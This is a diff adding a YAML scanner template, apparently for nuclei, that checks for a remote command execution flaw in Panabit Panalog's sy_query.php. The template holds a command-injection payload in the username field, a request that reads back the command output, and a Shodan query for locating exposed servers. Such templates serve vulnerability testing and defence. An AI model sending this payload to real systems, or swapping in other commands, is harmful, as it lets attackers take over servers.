@@ -1,0 +1,39 @@
+id: CVD-2021-14382
+
+info:
+  name: Panabit Panalog sy_query.php RCE
+  author: qwtd
+  severity: critical
+  description: |
+    Panalog is a log audit system, which is convenient for users to centrally monitor and manage massive Panabit devices on the network.
+    Panalog log audit system sy_query.php file has a remote command execution vulnerability. Attackers can execute arbitrary commands to take over server permissions.
+  reference:
+    - https://github.com/zan8in/pxplan/blob/fd87ef720bf9e7550512ef22bf1f84c3895e8b1c/goby_pocs/10-13-crack/redteam_20211105180004/CVD-2021-14382.go#L149
+  metadata:
+    max-request: 1
+    vendor: panabit
+    product: panalog
+    shodan-query: http.title:"Panalog"
+  tags: Panabit-Panalog
+
+http:
+  - raw:
+      - |
+        POST /account/sy_query.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=;id>{{randstr}}.txt
+
+      - |
+        GET /account/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - status_code_2==200 && regex("uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)", body_2)
+        condition: and
+
